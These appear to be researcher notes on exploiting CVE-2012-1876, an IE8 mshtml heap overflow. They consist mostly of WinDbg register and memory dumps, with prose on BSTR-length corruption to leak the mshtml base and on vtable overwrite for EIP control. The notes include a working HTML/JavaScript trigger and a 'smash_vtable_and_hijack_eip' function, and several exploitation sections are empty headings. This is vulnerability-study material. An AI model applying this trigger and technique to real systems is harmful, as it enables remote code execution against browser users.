# [CVE-2012-1876 Microsoft Internet Explorer 8 - Fixed Col Span ID Heap Overflow Exploitation (Full ASLR + DEP Bypass)](https://www.exploit-db.com/exploits/24017)

AAAA -> 4
%u4141%u4141 -> 2


(914.8c0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=06086ffc edi=06087014
eip=6368cd79 esp=0382e470 ebp=0382e47c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\mshtml.dll - 
mshtml!DllGetClassObject+0xfcdbc:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:06087014=????????

0n42765 * 0n100 = 0x414114

array2[i].length >  (0x100-6)/2  returns 125 which is 7d

array2[corrupted].length -> returns 32804

if span is 0n41, then ecx would be 0x10049 which would be 65609

32804 * 2 = 65608

if we set to 0n42, then ecx would be 10689 which would be 67209

67209/ 2 = 33604

Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce7fc0 edi=02ce7fd8
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce7fd8=00000000

Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce7fdc edi=02ce7ff4
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce7ff4=00000000

Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce7ff8 edi=02ce8010
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8010=00000000

Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8014 edi=02ce802c
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce802c=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8030 edi=02ce8048
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8048=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce804c edi=02ce8064
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8064=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8068 edi=02ce8080
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8080=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8084 edi=02ce809c
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce809c=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce80a0 edi=02ce80b8
eip=6368cd79 esp=0207df78 ebp=0207df84 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce80b8=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce7fc0 edi=02ce7fd8
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce7fd8=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce7fdc edi=02ce7ff4
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce7ff4=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce7ff8 edi=02ce8010
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8010=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8014 edi=02ce802c
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce802c=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8030 edi=02ce8048
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8048=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce804c edi=02ce8064
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8064=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8068 edi=02ce8080
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8080=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8084 edi=02ce809c
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce809c=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce80a0 edi=02ce80b8
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce80b8=00000000
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce80bc edi=02ce80d4
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce80d4=00300057
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce80d8 edi=02ce80f0
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce80f0=00540030
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce80f4 edi=02ce810c
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce810c=00300057
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8110 edi=02ce8128
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8128=00540030
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce812c edi=02ce8144
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8144=00300057
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8148 edi=02ce8160
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8160=00540030
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8164 edi=02ce817c
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce817c=00300057
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce8180 edi=02ce8198
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce8198=00540030
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce819c edi=02ce81b4
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce81b4=00300057
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce81b8 edi=02ce81d0
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce81d0=000000fa
0:007> dd 02ce81d0
02ce81d0  000000fa 00300077 00740030 00300077
02ce81e0  00740030 00300077 00740030 00300077
02ce81f0  00740030 00300077 00740030 00300077
02ce8200  00740030 00300077 00740030 00300077
02ce8210  00740030 00300077 00740030 00300077
02ce8220  00740030 00300077 00740030 00300077
02ce8230  00740030 00300077 00740030 00300077
02ce8240  00740030 00300077 00740030 00300077
0:007> ? fa
Evaluate expression: 250 = 000000fa
0:007> g
Breakpoint 0 hit
eax=00000009 ebx=00001004 ecx=00010049 edx=00000010 esi=02ce81d4 edi=02ce81ec
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02ce81ec=00300077

0:007> dc 02d483a4 + 7d
02d48421  77007400 30003000 77007400 30003000  .t.w.0.0.t.w.0.0
02d48431  77007400 30003000 77007400 30003000  .t.w.0.0.t.w.0.0
02d48441  77007400 30003000 77007400 30003000  .t.w.0.0.t.w.0.0
02d48451  77007400 30003000 77007400 30003000  .t.w.0.0.t.w.0.0
02d48461  77007400 30003000 77007400 30003000  .t.w.0.0.t.w.0.0
02d48471  77007400 30003000 77007400 30003000  .t.w.0.0.t.w.0.0
02d48481  77007400 30003000 77007400 30003000  .t.w.0.0.t.w.0.0
02d48491  77007400 30003000 77007400 ec000000  .t.w.0.0.t.w....
0:007> dc 02d483a4 + fa
02d4849e  3dec0000 0100e875 ae08ff0c 0f606377  ...=u.......wc`.
02d484ae  5ba80021 afa002d2 00016377 00000000  !..[....wc......
02d484be  08090000 ffff0108 0000ffff 00000000  ................
02d484ce  00000000 ffff0000 0080ffff ffff0000  ................
02d484de  0000ffff 00000000 00000000 00000000  ................
02d484ee  00000000 00240000 00200000 00000000  ......$... .....
02d484fe  00000000 00000000 00000000 00000000  ................
02d4850e  00000000 00000000 00000000 00000000  ................
0:007> dc 02d483a0
02d483a0  00010688 00300077 00740030 00300077  ....w.0.0.t.w.0.
02d483b0  00740030 00300077 00740030 00300077  0.t.w.0.0.t.w.0.
02d483c0  00740030 00300077 00740030 00300077  0.t.w.0.0.t.w.0.
02d483d0  00740030 00300077 00740030 00300077  0.t.w.0.0.t.w.0.
02d483e0  00740030 00300077 00740030 00300077  0.t.w.0.0.t.w.0.
02d483f0  00740030 00300077 00740030 00300077  0.t.w.0.0.t.w.0.
02d48400  00740030 00300077 00740030 00300077  0.t.w.0.0.t.w.0.
02d48410  00740030 00300077 00740030 00300077  0.t.w.0.0.t.w.0.
0:007> u 6377ae08 
mshtml!CButtonLayout::`vftable':
6377ae08 f5              cmc
6377ae09 6c              ins     byte ptr es:[edi],dx
6377ae0a 626342          bound   esp,qword ptr [ebx+42h]
6377ae0d 896663          mov     dword ptr [esi+63h],esp
6377ae10 92              xchg    eax,edx
6377ae11 696663d7b66263  imul    esp,dword ptr [esi+63h],offset mshtml!CFlowLayout::OnPropertyChange (6362b6d7)
6377ae18 27              daa
6377ae19 44              inc     esp
0:007> u 6377afa0 
mshtml!CButtonLayout::`vftable':
6377afa0 1dee6b6397      sbb     eax,97636BEEh
6377afa5 a261634dd2      mov     byte ptr ds:[D24D6361h],al
6377afaa 7b63            jnp     mshtml!CButtonLayout::`vftable'+0x6f (6377b00f)
6377afac 81d27b63faa3    adc     edx,0A3FA637Bh
6377afb2 94              xchg    eax,esp
6377afb3 63ea            arpl    dx,bp
6377afb5 da7b63          fidivr  dword ptr [ebx+63h]
6377afb8 04c0            add     al,0C0h
0:007> dc 02d483a4 + f0 - 20
02d48474  00300077 00740030 00300077 00740030  w.0.0.t.w.0.0.t.
02d48484  00300077 00740030 00300077 00740030  w.0.0.t.w.0.0.t.
02d48494  00300077 00740030 00000077 e8753dec  w.0.0.t.w....=u.
02d484a4  ff0c0100 6377ae08 00210f60 02d25ba8  ......wc`.!..[..
02d484b4  6377afa0 00000001 00000000 01080809  ..wc............
02d484c4  ffffffff 00000000 00000000 00000000  ................
02d484d4  ffffffff 00000080 ffffffff 00000000  ................
02d484e4  00000000 00000000 00000000 00000000  ................

0:007> dd 02d484a4
02d484a4  ff0c0100 6377ae08 42424242 02d25ba8
02d484b4  42424242 00000001 00000000 01080809
02d484c4  ffffffff 00000000 00000000 00000000
02d484d4  ffffffff 00000080 ffffffff 00000000
02d484e4  00000000 00000000 00000000 00000000
02d484f4  00000024 00000020 00000000 00000000
02d48504  00000000 00000000 00000000 00000000
02d48514  00000000 00000000 00000000 00000000
0:007> ed 02d484a4+8+8 6377afa0 
0:007> dd 02d484a4
02d484a4  ff0c0100 6377ae08 42424242 02d25ba8
02d484b4  6377afa0 00000001 00000000 01080809
02d484c4  ffffffff 00000000 00000000 00000000
02d484d4  ffffffff 00000080 ffffffff 00000000
02d484e4  00000000 00000000 00000000 00000000
02d484f4  00000024 00000020 00000000 00000000
02d48504  00000000 00000000 00000000 00000000
02d48514  00000000 00000000 00000000 00000000
0:007> ed 02d484a4+8+4 42424242
0:007> dd 02d484a4
02d484a4  ff0c0100 6377ae08 42424242 42424242
02d484b4  6377afa0 00000001 00000000 01080809
02d484c4  ffffffff 00000000 00000000 00000000
02d484d4  ffffffff 00000080 ffffffff 00000000
02d484e4  00000000 00000000 00000000 00000000
02d484f4  00000024 00000020 00000000 00000000
02d48504  00000000 00000000 00000000 00000000
02d48514  00000000 00000000 00000000 00000000
0:007> g




0:008> g
Breakpoint 0 hit
eax=00000009 ebx=00001068 ecx=00010689 edx=00000010 esi=02a10ca8 edi=02a10cc0
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02a10cc0=000000fa
0:008> g
Breakpoint 0 hit
eax=00000009 ebx=00001068 ecx=00010689 edx=00000010 esi=02a10cc4 edi=02a10cdc
eip=6368cd79 esp=0207a768 ebp=0207a774 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CTableColCalc::AdjustForCol+0x15:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:02a10cdc=00300077 <- last one
0:008> g

0:008> g
(c7c.750): Access violation - code c0000005 (!!! second chance !!!)
eax=076d0fe0 ebx=01000000 ecx=02a10dc8 edx=00000041 esi=0207f7c8 edi=02f61120
eip=636514db esp=0207f604 ebp=0207f638 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!NotifyElement+0x3e:
636514db ff5008          call    dword ptr [eax+8]    ds:0023:076d0fe8=????????


04141149 00414114 00414114 00414114 (how the memory is changed)

0x10 is changes, 0xc is left untouched

0:008> dc 02a10dc8 - 40
02a10d88  076d0fe0 076d0fe0 076d0fe0 00300077  ..m...m...m.w.0.
02a10d98  00740030 00300077 76d0fe08 076d0fe0  0.t.w.0....v..m.
02a10da8  076d0fe0 076d0fe0 00740030 00300077  ..m...m.0.t.w.0.
02a10db8  00740030 76d0fe08 076d0fe0 076d0fe0  0.t....v..m...m.
02a10dc8  076d0fe0 00206720 02f61120 6377afa0  ..m. g . .....wc
02a10dd8  76d0fe08 076d0fe0 076d0fe0 076d0fe0  ...v..m...m...m.
02a10de8  00000000 00000000 00000000 76d0fe08  ...............v
02a10df8  076d0fe0 076d0fe0 076d0fe0 00000000  ..m...m...m.....

w00tw0 is still there which is 0x6 x 2 = 0xc

1c intervals

function smash_vtable_and_hijack_eip(){
    var evil_col = document.getElementById("132");
    evil_col.width = "1245880";
    evil_col.span = "44";
}

1245880*100 to hex = 076d0fe0

0:007> dc 02d483a4 + f0 - 20
02d48474  00300077 00740030 00300077 00740030  w.0.0.t.w.0.0.t.
02d48484  00300077 00740030 00300077 00740030  w.0.0.t.w.0.0.t.
02d48494  00300077 00740030 00000077 e8753dec  w.0.0.t.w....=u.
02d484a4  ff0c0100 6377ae08 00210f60 02d25ba8  ......wc`.!..[..
02d484b4  6377afa0 00000001 00000000 01080809  ..wc............



### Vulnerability #1: Heap Overflow

```
<html>
<body>
<table style="table-layout:fixed" >
<col id="132" width="41" span="1" >&nbsp </col>
</table>
<script>
	function over_trigger() {
		var obj_col = document.getElementById("132");
		obj_col.width = "42765";
		obj_col.span = 1000;
	}
setTimeout("over_trigger();",1);
</script>
</body>
</html>
```

0:008> dd edi-50
047a0fc8  00414114 00414114 00414114 c0c0c0c0
047a0fd8  c0c0c0c0 c0c0c0c0 04141148 00414114
047a0fe8  00414114 00414114 c0c0c0c0 c0c0c0c0
047a0ff8  c0c0c0c0 04141148 ???????? ????????
047a1008  ???????? ???????? ???????? ????????
047a1018  ???????? ???????? ???????? ????????
047a1028  ???????? ???????? ???????? ????????
047a1038  ???????? ???????? ???????? ????????
0:008> r
eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=047a1000 edi=047a1018
eip=6368cd79 esp=0382e470 ebp=0382e47c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
mshtml!DllGetClassObject+0xfcdbc:
6368cd79 890f            mov     dword ptr [edi],ecx  ds:0023:047a1018=????????
0:008> ? 0n42765*0n100
Evaluate expression: 4276500 = 00414114

By changing the width and span parameter of the `<col>` tag, we are able to obtain heap overflow. Running the PoC and enabling page heap, we crash at `mshtml!CTableColCalc::AdjustForCol+0x15` which is called by `mshtml!CTableLayout::CalculateMinMax`. Breakpointing at CalculateMinMax(), we observe span value 0x1 stored via `mov eax,dword ptr [ebx+54h]`. We then call `mshtml!CImplAry::EnsureSizeWorker` which does heap allocation for the `<col>` object. Minimum size is 0x1c * 0x4 = 0x70. Returns an address which when we run `!heap -p -a ADDRESS`, we can observe the allocation in heap. After which, we arrive at `mshtml!CTableCol::GetAAspan` which returns the span value of the `<col>` object. This is called twice, once to retrieve the original value of span and the second to retrieve the value of span to be updated. Then we start copying over data using `mshtml!CTableColCalc::AdjustForCol`. There is no check when copying over the data which results in heap overflow.

For debugging purposes, we can pre-maturely load mshtml to set the breakpoints by using the command `sxe ld:mshtml`.

### Vulnerability #2: Arbitrary Read

Suppose we create the vulnerable `<col>` element, and then right after the `<col>` element we allocate a couple of BSTR strings. We trigger the heap overflow to overflow the element and overwrite the BSTR string metadata to change the length element of the BSTR string, allowing us to read beyond our BSTR string. We can read the `mshtml!CButtonLayout` object along with its vtable. The `mshtml!CButtonLayout` will give us the base address to `mshtml!CButtonLayout` while the overwriting the vtable will allow us to gain remote code execution. The vtable is used either at `mshtml!NotifyElement+0x38` or `Celement::EnsureStandardsModeChecked()`.

### Exploitation #1: Heap overflow to leak mshtml.dll 

### Exploitation #2: Heap spray

### Exploitation #3: Heap overflow to smash vtable and control EIP

### References:

- [Original article by VUPEN](https://archive.ph/9nFFY)

- [Analysis by tearorca](https://tearorca.github.io/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E/#%E7%BB%95%E8%BF%87aslr)

- [Analysis by ricew4ng](https://github.com/ricew4ng/BrowserSecurity/blob/master/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876/IE8%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9ECVE-2012-1876.md)

- [Analysis by KEENTeam](https://github.com/dominicwang/CVE-2012-1876/blob/master/Study-of-Exploit-Migitation-in-Modern-Browsers-KEENTeam-XCON2013.pdf)

- [Analysis by cnblogs](https://www.cnblogs.com/binarysystemloophole/articles/10885731.html)

- [Get 2011/before-2012 versions of Windows XP SP3 with IE8](https://crustywindo.ws/collection/Windows%20XP/)

- https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/
